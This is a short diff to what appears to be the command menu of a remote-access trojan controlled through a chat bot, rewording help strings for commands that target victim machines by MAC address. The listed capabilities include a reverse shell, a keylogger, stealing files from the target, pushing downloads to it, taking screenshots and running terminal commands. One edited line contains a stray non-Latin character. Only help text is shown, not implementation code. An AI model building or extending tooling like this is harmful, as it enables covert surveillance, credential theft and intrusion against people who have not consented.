@@ -27,25 +27,25 @@ memory = ''
 scripts_name = {
     MAC_ADDRES: "`<system MAC_ADDRES> <command>`: run command on one target",
 
-    "help":             "`help`: send this message",
+    "help":             "`help`: sendس this message",
 
-    "do_sleep":         "`do_sleep <scconds> <message>`: print message and sleep",
+    "do_sleep":         "`do_sleep <scconds> <message>`: prints a message and sleeps",
 
-    "get_info":         "`get_info`: get target info",
+    "get_info":         "`get_info`: gets target info",
 
-    "reverse_shell":    "`<system MAC_ADDRES> reverse_shell`: start reverse shell on target system",
+    "reverse_shell":    "`<system MAC_ADDRES> reverse_shell`: starts reverse shell on target's system",
 
-    "export_file":      "`export_file <download link>`: target donwload this file and save to script path",
+    "export_file":      "`export_file <download link>`: File will be exported on the target's system",
 
-    "import_file":      "`import_file <file route>`: get a file from target system",
+    "import_file":      "`import_file <file route>`: download's a file from target's system",
 
-    "screenshot":       "`screenshot`: Takes a screenshot, return the download link",
+    "screenshot":       "`screenshot`: Take's a screenshot & return's the download link",
 
-    "info":             "`info`: run `get_info` command!",
+    "info":             "`info`: runs `get_info` command!",
 
-    "cmd":              "`cmd <command>`: run command in target terminal",
+    "cmd":              "`cmd <command>`: runs commands in target's terminal",
 
-    "/start":           "`/start`: run `help` command!",
+    "/start":           "`/start`: runs `help` command!",
 
     "keylogger":        "`keylogger start/stop`: Starts keylogger. use keylogger stop to stop keylogger",
 
